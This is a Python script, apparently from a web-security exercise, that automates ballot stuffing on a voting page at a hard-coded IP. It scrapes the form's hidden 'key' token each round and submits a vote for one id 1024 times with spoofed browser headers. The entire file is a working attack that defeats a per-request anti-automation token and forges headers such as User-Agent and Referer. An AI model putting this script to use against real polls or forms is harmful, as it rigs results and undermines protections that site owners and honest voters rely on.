import requests
from bs4 import BeautifulSoup

URL = "http://158.69.76.135/level2.php"

payload = {"id": "1091", "holdthedoor": "Submit+Query", "key": ""}
headers = {
    "Host": "158.69.76.135",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    "Accept": "text/html, application/xhtml+xml, application/xml",
    "Accept-Language": "en-US, en",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "74",
    "Origin": "http://158.69.76.135",
    "Connection": "keep-alive",
    "Referer": "http://158.69.76.135/level2.php"
}

s = requests.Session()
for i in range(1024):
    response = s.get(URL)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, "html.parser")
        key = soup.find("input", {'name': "key"}).attrs['value']
        payload["key"] = key
        print("[GET]: The request has succeeded, key = {:s}.".format(key))
    else:
        print("[GET]: The request has fail : {:s}.".format(URL))
    response = s.post(URL, data=payload, headers=headers)
    if response.status_code == 200:
        print("{:d} The request has succeeded.".format(i))
    else:
        print("{:d} The request has fail.".format(i))
